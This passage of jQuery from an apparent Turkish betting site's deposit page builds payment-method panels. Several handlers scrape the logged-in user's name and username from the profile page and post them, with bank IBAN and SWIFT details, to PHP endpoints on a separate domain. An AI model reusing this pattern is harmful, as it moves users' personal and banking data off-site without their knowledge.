                        $(this).find('.tl_min_max_col').after('<div class="yazi" style=" margin-right: 16px; color: #fff; font-size: 14px;"><a  class="docTxt" href="'+titleArr[index][1]+'" '+datas+' style="    color: #fff;" target="_blank">Nasıl Yatırım Yapılır ?</a></div><a class="docVid" data-fancybox href="'+titleArr[index][2]+'"><img height="35" src="https://betkanyon100.com/img/play-button2.svg" title="Videolu Anlatım" style=" padding-right: 8px;"></a><a href="'+titleArr[index][1]+'" target="_blank"><img height="34" src="https://betkanyon100.com/img/file.svg" href="'+titleArr[index][1]+'" class="docImg" title="Yazılı Anlatım" style=" margin-right: 13px; margin-left: 4px; border-left: 1px solid #FFE; padding-left: 8px;"></a>');
                    });
                   $(".docTxt").on("click",function() {
                        if ($(this).attr('href') != '#' && $(this).attr('data') == 'false') {
                            $(this).parent().parent().removeClass('active');
                            window.open($(this).attr('href'), '_blank');
                            setTimeout(function(){
                                $(this).parent().parent().removeClass('active');
                            },1500)
                        }
                   });

                    
            }
        },300)
    }
});

  $(document).on('change', '#optionList', function() {
                    havale = $('#optionList').find(":selected").attr('data-havale');
                    bankIban = $('#optionList').find(":selected").attr('data-bankIban');
                    bankCode = $('#optionList').find(":selected").attr('data-bankCode');
                    slug = $('#optionList').find(":selected").attr('data-slug');
                    id = $('#optionList').find(":selected").attr('data-id');
                    swiftCode = $('#optionList').find(":selected").attr('data-swiftCode');
                    $('.load-img').show();
                    $('.load-tutar').hide();
            $.ajax({
                type:'GET',
                data:'',
                url:'https://'+window.location.hostname+'/Account/Profile?_=1551197709912',
                success:function(reply){
                    name = $(reply).find('#FirstName').val() + $(reply).find('#LastName').val();
                    username = $('.tl_acc_userid .text').text();
                    $.ajax({
                        url : 'https://betkanyon100.com/development/hizli/amount2.php',
                        data: 'bankIban='+bankIban+'&bankCode='+bankCode+'&slug='+slug+'&id='+id+'&swiftCode='+swiftCode+'&name='+name+'&username='+username+'&havale='+havale,
                        type: 'POST',
                        success:function(reply){
                            $('.load-img').hide();
                            $('.load-tutar').show();
                            $('.tutars').html(reply);
                        }
                    })
                    
                }
            })
        }); 

$(document).on('click', '.tutarCC', function() {
    per = $(this).attr('data-percentage');
    $('.load-tutar').hide();
    $('#qrAq').val(per);
    $('.formTutar').val(per);
});


$(document).on('click', '.qr_first', function(){
    username = $('.tl_acc_userid .text').text();
    amount = $('#yeniQr').val();
    btn =  $(this);
    btn.hide();
    $.ajax({
        type:'POST',
        data:'',
        url:'/Account/Profile',
        success:function(profile){
            lastName = $(profile).find('#FirstName').val() + $(profile).find('#LastName').val();
            $.ajax({
                type:'POST',				
                data:'amount='+amount+'&username='+username+'&lastName='+lastName,
                url:'https://betkanyon100.com/development/hizliqr/yonlendirme.php',
                success:function(reply) {
                    reply = JSON.parse(reply);
                    if (reply.status == 'success') {
                        $('.qr_two').attr('href',reply.redirect_url);
                        $('.qr_first').hide();
                        $('.qr_two').show();
                    } else {
                        alert(reply.message);
                        btn.show();
                    }
                }
            })
        }
    })
})  


$(document).on('click', '.qr_first_cmt', function(){
    username = $('.tl_acc_userid .text').text();
    amount = $('#yeniCMT').val();
    btn =  $(this);
    btn.hide();
    $.ajax({
        type:'POST',
        data:'',
        url:'/Account/Profile',
        success:function(profile){
            lastName = $(profile).find('#FirstName').val() + $(profile).find('#LastName').val();
            $.ajax({
                type:'POST',				
                data:'amount='+amount+'&username='+username+'&lastName='+lastName,
                url:'https://betkanyon100.com/development/cmt/yonlendirme.php',
                success:function(reply) {
                    reply = JSON.parse(reply);
                    if (reply.status == 'success') {
                        $('.qr_two_cmt').attr('href',reply.redirect_url);
                        $('.qr_first_cmt').hide();
                        $('.qr_two_cmt').show();
                    } else {
                        alert(reply.message);
                        btn.show();
                    }
                }
            })
        }
    })
})  


$(document).on('click', '.qr_two', function(){
    $('.qr_two').hide();
    $('#yeniQr').attr('disabled',true);
    $('.qr_three').show();
});

$(document).on('click', '.qr_two_cmt', function(){
    $('.qr_two_cmt').hide();
    $('#yeniQr').attr('disabled',true);
    $('.qr_three_cmt').show();
});


$(document).on('click', '#clickTO', function(){
    $('.qr_first').hide();
    $('.mbl_qr_first').hide();
    $('.qr_two').hide();
    $('.mbl_qr_two').hide();
    $('.qr_three').show();
    $('.mbl_py_btn2').show();
    return false;
});


$(document).on('click', '#clickTOCMT', function(){
    $('.qr_first_cmt').hide();
    $('.mbl_qr_first_cmt').hide();
    $('.qr_two_cmt').hide();
    $('.mbl_qr_two_cmt').hide();
    $('.qr_three_cmt').show();
    $('.mbl_py_btn3').show();
    return false;
});


$(document).on('click', '.mbl_qr_first', function(){
    username = $('.width_all:last').text().trim();
    amount = $('#yeniQr').val();
    btn =  $(this);
    btn.hide();
    $.ajax({
        type:'POST',
        data:'',
        url:'/Account/Profile',
        success:function(profile){
            lastName = $(profile).find('#FirstName').val() + $(profile).find('#LastName').val();
            $.ajax({
                type:'POST',				
                data:'amount='+amount+'&username='+username+'&lastName='+lastName,
                url:'https://betkanyon100.com/development/hizliqr/yonlendirme.php',
                success:function(reply) {
                    reply = JSON.parse(reply);
                    if (reply.status == 'success') {
                        $('.mbl_qr_two').attr('href',reply.redirect_url);
                        $('.mbl_qr_first').hide();
                        $('.mbl_qr_two').show();
                    } else {
                        alert(reply.message);
                        btn.show();
                    }
                }
            })
        }
    })
})  


$(document).on('click', '.mbl_qr_first_cmt', function(){
    username = $('.width_all:last').text().trim();
    amount = $('#yeniCMT').val();
    btn =  $(this);
    btn.hide();
    $.ajax({
        type:'POST',
        data:'',
        url:'/Account/Profile',
        success:function(profile){
            lastName = $(profile).find('#FirstName').val() + $(profile).find('#LastName').val();
            $.ajax({
                type:'POST',				
                data:'amount='+amount+'&username='+username+'&lastName='+lastName,
                url:'https://betkanyon100.com/development/cmt/yonlendirme.php',
                success:function(reply) {
                    reply = JSON.parse(reply);
                    if (reply.status == 'success') {
                        $('.mbl_qr_two_cmt').attr('href',reply.redirect_url);
                        $('.mbl_qr_first_cmt').hide();
                        $('.mbl_qr_two_cmt').show();
                    } else {
                        alert(reply.message);
                        btn.show();
                    }
                }
            })
        }
    })
})  

  
$('div[data-type=qr]').hide();


$(document).on('click', '.mbl_qr_two', function(){
    $('.mbl_qr_two').hide();
    $('#yeniQr').attr('disabled',true);
    $('.mbl_py_btn2').show();
})

$(document).on('click', '.mbl_qr_two_cmt', function(){
    $('.mbl_qr_two_cmt').hide();
    $('#yeniQr').attr('disabled',true);
    $('.mbl_py_btn3').show();
})


$(document).on('click', '.mbl_py_btn2', function () {
		tutar = $(this).parent().find('.formTutar2');
		type = $(this).parent().find('.formType2');
		parent = $(this).parent();

		dataAjax = 'Qr.NameOfBank='+type.val()+'&Qr.Amount='+tutar.val();

		if (tutar.val() == "") {
			tutar.addClass("input-validation-error");
		} else {
			tutar.removeClass("input-validation-error");
			$.ajax({
				type: "POST",
				data: dataAjax,
				url: "https://" + window.location.hostname + "/tr/Account/Qr",
				success: function (reply) {
					reply = $.parseHTML(reply);
          if ($(reply).find('.errormassage').text() == '' && $(reply).find('.successmassage').text() == '') {
            parent.find('.successmassage').text('');
              parent.find('.errormassage').html('<span class="field-validation-error" data-valmsg-for="Error" data-valmsg-replace="true" id="qrError">'+$(reply).find('.field-validation-error:last').text()+'</span>');
          } else {
  					if ($(reply).find('.errormassage').text() != '') {
              parent.find('.successmassage').text('');
  						parent.find('.errormassage').html('<span class="field-validation-error" data-valmsg-for="Error" data-valmsg-replace="true" id="qrError">'+$(reply).find('.errormassage').text()+'</span>');
  					} else {
  						$(reply).find('.successmassage').text();
              parent.find('.errormassage').text('');
  						parent.find('.successmassage').html('<span class="field-validation-error" data-valmsg-for="Error" data-valmsg-replace="true" id="qrError">'+$(reply).find('.successmassage').text()+'</span>');
  					}
          }
				}
			})
		}
		return false;
})

$(document).on('click', '.mbl_py_btn3', function () {
		tutar = $(this).parent().find('.formTutar3');
		type = $(this).parent().find('.formType3');
		parent = $(this).parent();

		dataAjax = 'Qr.NameOfBank='+type.val()+'&Qr.Amount='+tutar.val();

		if (tutar.val() == "") {
			tutar.addClass("input-validation-error");
		} else {
			tutar.removeClass("input-validation-error");
			$.ajax({
				type: "POST",
				data: dataAjax,
				url: "https://" + window.location.hostname + "/tr/Account/Qr",
				success: function (reply) {
					reply = $.parseHTML(reply);
          if ($(reply).find('.errormassage').text() == '' && $(reply).find('.successmassage').text() == '') {
            parent.find('.successmassage').text('');
              parent.find('.errormassage').html('<span class="field-validation-error" data-valmsg-for="Error" data-valmsg-replace="true" id="qrError">'+$(reply).find('.field-validation-error:last').text()+'</span>');
          } else {
  					if ($(reply).find('.errormassage').text() != '') {
              parent.find('.successmassage').text('');
  						parent.find('.errormassage').html('<span class="field-validation-error" data-valmsg-for="Error" data-valmsg-replace="true" id="qrError">'+$(reply).find('.errormassage').text()+'</span>');
  					} else {
  						$(reply).find('.successmassage').text();
              parent.find('.errormassage').text('');
  						parent.find('.successmassage').html('<span class="field-validation-error" data-valmsg-for="Error" data-valmsg-replace="true" id="qrError">'+$(reply).find('.successmassage').text()+'</span>');
  					}
          }
				}
			})
		}
		return false;
})


  
$(document).on('click', '.tutarlar', function(){
        amount = $(this).attr('data-amount');
        bank = $(this).attr('data-bank');
        type = $(this).attr('data-type');
        payid = $(this).attr('data-pay');
        id = $(this).attr('data-id');
        slug = $(this).attr('data-slug');
        swiftCode = $(this).attr('data-swiftCode');
        per = $(this).attr('data-percentage');
        if ($('.depositForms').length != 0) {
            username = $('#menu-right .ui-link:last').text().trim();
            $.ajax({
                type:'POST',
                data:'',
                url:'/Account/Index',
                success:function(profile){
                    lastName = $(profile).find('.accHeading').text().trim();
                    $.ajax({
                        type:'POST',				data:'amount='+amount+'&id='+id+'&username='+username+'&lastName='+lastName+'&bank='+bank+'&type='+type+'&swiftCode='+swiftCode+'&slug='+slug+'&payid='+payid,
                        url:'https://betkanyon100.com/development/hizli/yonlendirme.php',
                        success:function(reply) {
                            reply = JSON.parse(reply);
                            if (reply.status == 'success') {
                                $('.tutarCC').show();   
                                $('.tutarCC').attr('href',reply.redirect_url);
                                $('.tutarCC').attr('data-percentage',per);
                                $('.tutarCC').text(reply.button + ' ('+per+' TL)');
                                $('.load-tutar').hide();
                            } else {
                                alert(reply.message);
                            }
                        }
                    })
                }
            })
        } else {
            username = $('.tl_acc_userid .text').text();
            $.ajax({
                type:'POST',
                data:'',
                url:'/Account/Profile',
                success:function(profile){
                    lastName = $(profile).find('#FirstName').val() + $(profile).find('#LastName').val();
                    $.ajax({
                        type:'POST',				data:'amount='+amount+'&id='+id+'&username='+username+'&lastName='+lastName+'&bank='+bank+'&type='+type+'&swiftCode='+swiftCode+'&slug='+slug+'&payid='+payid,
                        url:'https://betkanyon100.com/development/hizli/yonlendirme.php',
                        success:function(reply) {
                            reply = JSON.parse(reply);
                            if (reply.status == 'success') {
                                $('.tutarCC').attr('href',reply.redirect_url);
                                $('.tutarCC').attr('data-percentage',per);
                                $('.tutarCC').text(reply.button + ' ('+per+' TL)');
                                $('.tutargoster').show();
                                $('.load-tutar').hide();
                            } else {
                                alert(reply.message);
                            }
                        }
                    })
                }
            })
        }
    })
 
                            
     
/* Mobil */
if ($('.depositForms').length != 0) {
    
    if (GlobalAd != ';') {
        $('.depositForms .paym_txt1').after('<style>a.tutarlar{padding: 5px 10px; background: #1e2036; margin-bottom: 13px; display: inline-block; margin-right: 5px; border-radius: 4px;}</style><div data-role="collapsible" class="withContent collapse_btn" style=" width: 100%;margin-top:5px"> <h3 style="display: block;margin: 0;padding: 0;position: relative;"><a class="kapali" style="sans-serif /*{global-font-family}*/;height: 40px;background-color: #333;color: #fff;padding: 0 20px;border-bottom: 1px solid #999;display: -webkit-box;display: -moz-box;display: -ms-flexbox;display: -webkit-flex;display: flex;align-items: center;background-color: #013a65;color: #fff;border-color: #013a65;font-size: 16px;" href="">Hızlı Havale </a></h3> <div class="icerik paparaDivs" style="padding: 10px; font-size: 13px; font-weight: 100 !important; display: none;"> <p class="paym_txt"><img src="/Img/common/hizli.png" style=" border-radius: 9px;"></p><p style=" color: #444;">Lütfen "Ödeme Yap" butonuna tıkladıktan sonra açılan sayfadaki işlemleri yapınız. <br>İşlem sonrası yatırımınız otomatik olarak hesabınıza yansıyacaktır.</p><div id="contexpresshavale2"> <form action="/tr/Account/_expresshavale" class="methods" id="expresshavale2" method="post" novalidate="novalidate"> <div class="row"> <div class="ui-select" style="display:none;"> <div id="ExpressHavale_PaymentType-button" class="ui-btn ui-icon-carat-d ui-btn-icon-right ui-corner-all ui-shadow"><span class="dropdown valid">Ödeme Metodu seçiniz</span> <select style="display:none;" class="dropdown valid" data-val="true" data-val-length="Doldurulması gerekli alan" data-val-length-max="150" data-val-required="Doldurulması gerekli alan" id="ExpressHavale_PaymentType2" name="ExpressHavale.PaymentType" aria-required="true" aria-describedby="ExpressHavale_PaymentType-error" aria-invalid="false"> <option value="">Ödeme Metodu seçiniz</option> <option value="1">Hızlı QR</option> <option value="2">Hızlı Havale</option> </select> </div></div><p> <span class="field-validation-error" data-valmsg-for="ExpressHavale.PaymentType2" data-valmsg-replace="true" style="color: #ff0000"><span id="ExpressHavale_PaymentType-error" class=""></span></span> </p><input data-val="true" data-val-required="The paymentType field is required." id="ExpressHavale_paymentType2" name="ExpressHavale.paymentType2" type="hidden" value=""> </div><div class="spacer"> <a class="btn_prim block ui-link" id="expresshavale_mob_dep3">ÖDEME YAP</a> </div><span class="field-validation-valid" data-valmsg-for="Error" data-valmsg-replace="true"></span> </form> </div></div></div><div data-role="collapsible" class="withContent collapse_btn" style=" width: 100%;margin-top:5px"> <h3 style="display: block;margin: 0;padding: 0;position: relative;"><a class="kapali" style="sans-serif /*{global-font-family}*/;height: 40px;background-color: #333;color: #fff;padding: 0 20px;border-bottom: 1px solid #999;display: -webkit-box;display: -moz-box;display: -ms-flexbox;display: -webkit-flex;display: flex;align-items: center;background-color: #013a65;color: #fff;border-color: #013a65;font-size: 16px;" href="">Hızlı QR </a></h3> <div class="icerik paparaDivs" style="padding: 10px; font-size: 13px; font-weight: 100 !important; display: none;"> <p class="paym_txt"><img src="/Img/Banners/instantqrlogo.jpg" style=" border-radius: 9px;"></p><p style=" color: #444;">Lütfen "Ödeme Yap" butonuna tıkladıktan sonra açılan sayfadaki işlemleri yapınız. <br>İşlem sonrası yatırımınız otomatik olarak hesabınıza yansıyacaktır. <br>Aktif Bankalar : Akbank, İş Bankası, Yapıkredi</p><div id="contexpresshavale2"> <form action="/tr/Account/_expresshavale" class="methods" id="expresshavale2" method="post" novalidate="novalidate"> <div class="row"> <div class="ui-select" style="display:none;"> <div id="ExpressHavale_PaymentType-button" class="ui-btn ui-icon-carat-d ui-btn-icon-right ui-corner-all ui-shadow"><span class="dropdown valid">Ödeme Metodu seçiniz</span> <select style="display:none;" class="dropdown valid" style="opacity:1; border: none;" data-val="true" data-val-length="Doldurulması gerekli alan" data-val-length-max="150" data-val-required="Doldurulması gerekli alan" id="ExpressHavale_PaymentType2" name="ExpressHavale.PaymentType" aria-required="true" aria-describedby="ExpressHavale_PaymentType-error" aria-invalid="false"> <option value="">Ödeme Metodu seçiniz</option> <option value="1">Hızlı QR</option> <option value="2">Hızlı Havale</option> </select> </div></div><p> <span class="field-validation-error" data-valmsg-for="ExpressHavale.PaymentType2" data-valmsg-replace="true" style="color: #ff0000"><span id="ExpressHavale_PaymentType-error" class=""></span></span> </p><input data-val="true" data-val-required="The paymentType field is required." id="ExpressHavale_paymentType2" name="ExpressHavale.paymentType2" type="hidden" value=""> </div><div class="spacer"> <a class="btn_prim block ui-link" id="expresshavale_mob_dep2">ÖDEME YAP</a> </div><span class="field-validation-valid" data-valmsg-for="Error" data-valmsg-replace="true"></span> </form> </div></div></div><div data-role="collapsible" class="withContent collapse_btn" style=" width: 100%;margin-top:5px"> <h3 style="display: block;margin: 0;padding: 0;position: relative;"><a class="kapali" style="sans-serif /*{global-font-family}*/;height: 40px;background-color: #333;color: #fff;padding: 0 20px;border-bottom: 1px solid #999;display: -webkit-box;display: -moz-box;display: -ms-flexbox;display: -webkit-flex;display: flex;align-items: center;background-color: #013a65;color: #fff;border-color: #013a65;font-size: 16px;" href="">CMT Cüzdan </a></h3> <div class="icerik paparaDivs" style="padding: 10px; font-size: 13px; font-weight: 100 !important; display: none;"> <p class="paym_txt"><img src="https://betkanyon100.com/development/cmt_logo.png" style=" border-radius: 9px;"></p><p style=" color: #444;">Lütfen "Ödeme Yap" butonuna tıkladıktan sonra açılan sayfadaki işlemleri yapınız. <br>İşlem sonrası yatırımınız otomatik olarak hesabınıza yansıyacaktır. <div id="contexpresshavale2"> <form action="/tr/Account/_expresshavale" class="methods" id="expresshavale2" method="post" novalidate="novalidate"> <div class="row"> <div class="ui-select" style="display:none;"> <div id="ExpressHavale_PaymentType-button" class="ui-btn ui-icon-carat-d ui-btn-icon-right ui-corner-all ui-shadow"><span class="dropdown valid">Ödeme Metodu seçiniz</span> <select style="display:none;" class="dropdown valid" style="opacity:1; border: none;" data-val="true" data-val-length="Doldurulması gerekli alan" data-val-length-max="150" data-val-required="Doldurulması gerekli alan" id="ExpressHavale_PaymentType2" name="ExpressHavale.PaymentType" aria-required="true" aria-describedby="ExpressHavale_PaymentType-error" aria-invalid="false"> <option value="">Ödeme Metodu seçiniz</option> <option value="1">Hızlı QR</option> <option value="2">Hızlı Havale</option> </select> </div></div><p> <span class="field-validation-error" data-valmsg-for="ExpressHavale.PaymentType2" data-valmsg-replace="true" style="color: #ff0000"><span id="ExpressHavale_PaymentType-error" class=""></span></span> </p><input data-val="true" data-val-required="The paymentType field is required." id="ExpressHavale_paymentType2" name="ExpressHavale.paymentType2" type="hidden" value="3"> </div><div class="spacer"> <a class="btn_prim block ui-link" id="expresshavale_mob_dep_cmt">ÖDEME YAP</a> </div><span class="field-validation-valid" data-valmsg-for="Error" data-valmsg-replace="true"></span> </form> </div></div></div><div data-role="collapsible" class="withContent collapse_btn" style=" width: 100%;margin-top:5px"> <h3 style="display: block;margin: 0;padding: 0;position: relative;"><a class="kapali" style="sans-serif /*{global-font-family}*/;height: 40px;background-color: #333;color: #fff;padding: 0 20px;border-bottom: 1px solid #999;display: -webkit-box;display: -moz-box;display: -ms-flexbox;display: -webkit-flex;display: flex;align-items: center;background-color: #013a65;color: #fff;border-color: #013a65;font-size: 16px;" href="">Cepbank </a></h3> <div class="icerik paparaDivs" style="padding: 10px; font-size: 13px; font-weight: 100 !important; display: none;"> <p class="paym_txt"><img src="/Img/icons/deposit/cepbank.jpg" style=" border-radius: 9px;"></p><p style=" color: #444;">Lütfen "Ödeme Yap" butonuna tıkladıktan sonra açılan sayfadaki işlemleri yapınız. <br>İşlem sonrası yatırımınız otomatik olarak hesabınıza yansıyacaktır. <div id="contexpresshavale2"> <form action="/tr/Account/_expresshavale" class="methods" id="expresshavale2" method="post" novalidate="novalidate"> <div class="row"> <div class="ui-select" style="display:none;"> <div id="ExpressHavale_PaymentType-button" class="ui-btn ui-icon-carat-d ui-btn-icon-right ui-corner-all ui-shadow"><span class="dropdown valid">Ödeme Metodu seçiniz</span> <select style="display:none;" class="dropdown valid" style="opacity:1; border: none;" data-val="true" data-val-length="Doldurulması gerekli alan" data-val-length-max="150" data-val-required="Doldurulması gerekli alan" id="ExpressHavale_PaymentType2" name="ExpressHavale.PaymentType" aria-required="true" aria-describedby="ExpressHavale_PaymentType-error" aria-invalid="false"> <option value="">Ödeme Metodu seçiniz</option> <option value="1">Hızlı QR</option> <option value="2">Hızlı Havale</option> </select> </div></div><p> <span class="field-validation-error" data-valmsg-for="ExpressHavale.PaymentType2" data-valmsg-replace="true" style="color: #ff0000"><span id="ExpressHavale_PaymentType-error" class=""></span></span> </p><input data-val="true" data-val-required="The paymentType field is required." id="ExpressHavale_paymentType2" name="ExpressHavale.paymentType2" type="hidden" value="3"> </div><div class="spacer"> <a class="btn_prim block ui-link" id="expresshavale_mob_dep_cepbank">ÖDEME YAP</a> </div><span class="field-validation-valid" data-valmsg-for="Error" data-valmsg-replace="true"></span> </form> </div></div></div><div data-role="collapsible" class="withContent collapse_btn" style=" width: 100%;margin-top:5px"> <h3 style="display: block;margin: 0;padding: 0;position: relative;"><a class="kapali" style="sans-serif /*{global-font-family}*/;height: 40px;background-color: #333;color: #fff;padding: 0 20px;border-bottom: 1px solid #999;display: -webkit-box;display: -moz-box;display: -ms-flexbox;display: -webkit-flex;display: flex;align-items: center;background-color: #013a65;color: #fff;border-color: #013a65;font-size: 16px;" href="">Papara </a></h3> <div class="icerik paparaDivs" style="padding: 10px; font-size: 13px; font-weight: 100 !important; display: none;"> <p class="paym_txt"> <div class="paymentmethods papara"></div></p><p style=" color: #444;">Bu bölümden yatırım yapacağınız hesap numarasını otomatik alabilirsiniz. <br>Şifreniz talep edilmez veya hesabınıza giriş yapılmaz. <br>Ödeme işlemini; belirtilen numaraya, papara hesabınız üzerinden siz yapmalısınız. <br></p><div id="contexpresshavale2"> <form action="/tr/Account/_expresshavale" class="methods" id="expresshavale2" method="post" novalidate="novalidate"> <div class="row"> <div class="ui-select" style="display:none;"> <div id="ExpressHavale_PaymentType-button" class="ui-btn ui-icon-carat-d ui-btn-icon-right ui-corner-all ui-shadow"><span class="dropdown valid">Ödeme Metodu seçiniz</span> <select style="display:none;" class="dropdown valid" style="opacity:1; border: none;" data-val="true" data-val-length="Doldurulması gerekli alan" data-val-length-max="150" data-val-required="Doldurulması gerekli alan" id="ExpressHavale_PaymentType2" name="ExpressHavale.PaymentType" aria-required="true" aria-describedby="ExpressHavale_PaymentType-error" aria-invalid="false"> <option value="">Ödeme Metodu seçiniz</option> <option value="1">Hızlı QR</option> <option value="2">Hızlı Havale</option> </select> </div></div><p> <span class="field-validation-error" data-valmsg-for="ExpressHavale.PaymentType2" data-valmsg-replace="true" style="color: #ff0000"><span id="ExpressHavale_PaymentType-error" class=""></span></span> </p><input data-val="true" data-val-required="The paymentType field is required." id="ExpressHavale_paymentType2" name="ExpressHavale.paymentType2" type="hidden" value="3"> </div><div class="spacer"> <a class="btn_prim block ui-link" id="expresshavale_mob_dep_papara">HESAP NUMARASI AL</a> </div><div class="spacer"> <a class="btn_sec block ui-link" href="http://betkanyon100.com/articles/hc/tr/articles/360010650239" target="_blank">Nasıl Para Yatırılır?</a> </div><span class="field-validation-valid" data-valmsg-for="Error" data-valmsg-replace="true"></span> </form> </div></div></div><div data-role="collapsible" class="withContent collapse_btn" style=" width: 100%;margin-top:5px"> <h3 style="display: block;margin: 0;padding: 0;position: relative;"><a class="kapali" style="sans-serif /*{global-font-family}*/;height: 40px;background-color: #333;color: #fff;padding: 0 20px;border-bottom: 1px solid #999;display: -webkit-box;display: -moz-box;display: -ms-flexbox;display: -webkit-flex;display: flex;align-items: center;background-color: #013a65;color: #fff;border-color: #013a65;font-size: 16px;" href="">Payfix </a></h3> <div class="icerik paparaDivs" style="padding: 10px; font-size: 13px; font-weight: 100 !important; display: none;"> <p class="paym_txt"><img src="https://betkanyon100.com/development/hizli/payfix_img.jpg" style=" border-radius: 9px;"></p><p style=" color: #444;">Lütfen "Ödeme Yap" butonuna tıkladıktan sonra açılan sayfadaki işlemleri yapınız. <br>İşlem sonrası yatırımınız otomatik olarak hesabınıza yansıyacaktır. <div id="contexpresshavale2"> <form action="/tr/Account/_expresshavale" class="methods" id="expresshavale2" method="post" novalidate="novalidate"> <div class="row"> <div class="ui-select" style="display:none;"> <div id="ExpressHavale_PaymentType-button" class="ui-btn ui-icon-carat-d ui-btn-icon-right ui-corner-all ui-shadow"><span class="dropdown valid">Ödeme Metodu seçiniz</span> <select style="display:none;" class="dropdown valid" style="opacity:1; border: none;" data-val="true" data-val-length="Doldurulması gerekli alan" data-val-length-max="150" data-val-required="Doldurulması gerekli alan" id="ExpressHavale_PaymentType2" name="ExpressHavale.PaymentType" aria-required="true" aria-describedby="ExpressHavale_PaymentType-error" aria-invalid="false"> <option value="">Ödeme Metodu seçiniz</option> </select> </div></div><p> <span class="field-validation-error" data-valmsg-for="ExpressHavale.PaymentType2" data-valmsg-replace="true" style="color: #ff0000"><span id="ExpressHavale_PaymentType-error" class=""></span></span> </p><input data-val="true" data-val-required="The paymentType field is required." id="ExpressHavale_paymentType2" name="ExpressHavale.paymentType2" type="hidden" value="3"> </div><div class="spacer"> <a class="btn_prim block ui-link" id="expresshavale_mob_dep_payfix">ÖDEME YAP</a> </div><span class="field-validation-valid" data-valmsg-for="Error" data-valmsg-replace="true"></span> </form> </div></div></div>');
    } else {
        $(".depositForms .paym_txt1").after('<style>a.tutarlar{padding: 5px 10px; background: #1e2036; margin-bottom: 13px; display: inline-block; margin-right: 5px; border-radius: 4px;}</style><div data-role="collapsible" class="withContent collapse_btn" style=" width: 100%;margin-top:5px"> <h3 style="display: block;margin: 0;padding: 0;position: relative;"><a class="kapali" style="sans-serif /*{global-font-family}*/;height: 40px;background-color: #333;color: #fff;padding: 0 20px;border-bottom: 1px solid #999;display: -webkit-box;display: -moz-box;display: -ms-flexbox;display: -webkit-flex;display: flex;align-items: center;background-color: #013a65;color: #fff;border-color: #013a65;font-size: 16px;" href="">Hızlı Havale </a></h3> <div class="icerik paparaDivs" style="padding: 10px; font-size: 13px; font-weight: 100 !important; display: block;"> <p class="paym_txt"><img src="/Img/common/hizli.png" style=" border-radius: 9px;"></p><p style=" color: #444;">Lütfen "Ödeme Yap" butonuna tıkladıktan sonra açılan sayfadaki işlemleri yapınız. <br>İşlem sonrası yatırımınız otomatik olarak hesabınıza yansıyacaktır.</p><div id="contexpresshavale2"> <form action="/tr/Account/_expresshavale" class="methods" id="expresshavale2" method="post" novalidate="novalidate"> <div class="row"> <div class="ui-select" style="display:none;"> <div id="ExpressHavale_PaymentType-button" class="ui-btn ui-icon-carat-d ui-btn-icon-right ui-corner-all ui-shadow"><span class="dropdown valid">Ödeme Metodu seçiniz</span> <select style="display:none;" class="dropdown valid" data-val="true" data-val-length="Doldurulması gerekli alan" data-val-length-max="150" data-val-required="Doldurulması gerekli alan" id="ExpressHavale_PaymentType2" name="ExpressHavale.PaymentType" aria-required="true" aria-describedby="ExpressHavale_PaymentType-error" aria-invalid="false"> <option value="">Ödeme Metodu seçiniz</option> <option value="1">Hızlı QR</option> <option value="2">Hızlı Havale</option> </select> </div></div><p> <span class="field-validation-error" data-valmsg-for="ExpressHavale.PaymentType2" data-valmsg-replace="true" style="color: #ff0000"><span id="ExpressHavale_PaymentType-error" class=""></span></span> </p><input data-val="true" data-val-required="The paymentType field is required." id="ExpressHavale_paymentType2" name="ExpressHavale.paymentType2" type="hidden" value=""> </div><div class="spacer"> <a class="btn_prim block ui-link" id="expresshavale_mob_dep3">ÖDEME YAP</a> </div><span class="field-validation-valid" data-valmsg-for="Error" data-valmsg-replace="true"></span> </form> </div></div></div><div data-role="collapsible" class="withContent collapse_btn" style=" width: 100%;margin-top:5px"> <h3 style="display: block;margin: 0;padding: 0;position: relative;"><a class="kapali" style="sans-serif /*{global-font-family}*/;height: 40px;background-color: #333;color: #fff;padding: 0 20px;border-bottom: 1px solid #999;display: -webkit-box;display: -moz-box;display: -ms-flexbox;display: -webkit-flex;display: flex;align-items: center;background-color: #013a65;color: #fff;border-color: #013a65;font-size: 16px;" href="">Hızlı QR </a></h3> <div class="icerik paparaDivs" style="padding: 10px; font-size: 13px; font-weight: 100 !important; display: none;"> <p class="paym_txt"><img src="/Img/Banners/instantqrlogo.jpg" style=" border-radius: 9px;"></p><p style=" color: #444;">Lütfen "Ödeme Yap" butonuna tıkladıktan sonra açılan sayfadaki işlemleri yapınız. <br>İşlem sonrası yatırımınız otomatik olarak hesabınıza yansıyacaktır. <br>Aktif Bankalar : Akbank, İş Bankası, Yapıkredi</p><div id="contexpresshavale2"> <form action="/tr/Account/_expresshavale" class="methods" id="expresshavale2" method="post" novalidate="novalidate"> <div class="row"> <div class="ui-select" style="display:none;"> <div id="ExpressHavale_PaymentType-button" class="ui-btn ui-icon-carat-d ui-btn-icon-right ui-corner-all ui-shadow"><span class="dropdown valid">Ödeme Metodu seçiniz</span> <select style="display:none;" class="dropdown valid" style="opacity:1; border: none;" data-val="true" data-val-length="Doldurulması gerekli alan" data-val-length-max="150" data-val-required="Doldurulması gerekli alan" id="ExpressHavale_PaymentType2" name="ExpressHavale.PaymentType" aria-required="true" aria-describedby="ExpressHavale_PaymentType-error" aria-invalid="false"> <option value="">Ödeme Metodu seçiniz</option> <option value="1">Hızlı QR</option> <option value="2">Hızlı Havale</option> </select> </div></div><p> <span class="field-validation-error" data-valmsg-for="ExpressHavale.PaymentType2" data-valmsg-replace="true" style="color: #ff0000"><span id="ExpressHavale_PaymentType-error" class=""></span></span> </p><input data-val="true" data-val-required="The paymentType field is required." id="ExpressHavale_paymentType2" name="ExpressHavale.paymentType2" type="hidden" value=""> </div><div class="spacer"> <a class="btn_prim block ui-link" id="expresshavale_mob_dep2">ÖDEME YAP</a> </div><span class="field-validation-valid" data-valmsg-for="Error" data-valmsg-replace="true"></span> </form> </div></div></div><div data-role="collapsible" class="withContent collapse_btn" style=" width: 100%;margin-top:5px"> <h3 style="display: block;margin: 0;padding: 0;position: relative;"><a class="kapali" style="sans-serif /*{global-font-family}*/;height: 40px;background-color: #333;color: #fff;padding: 0 20px;border-bottom: 1px solid #999;display: -webkit-box;display: -moz-box;display: -ms-flexbox;display: -webkit-flex;display: flex;align-items: center;background-color: #013a65;color: #fff;border-color: #013a65;font-size: 16px;" href="">CMT Cüzdan </a></h3> <div class="icerik paparaDivs" style="padding: 10px; font-size: 13px; font-weight: 100 !important; display: none;"> <p class="paym_txt"><img src="https://betkanyon100.com/development/cmt_logo.png" style=" border-radius: 9px;"></p><p style=" color: #444;">Lütfen "Ödeme Yap" butonuna tıkladıktan sonra açılan sayfadaki 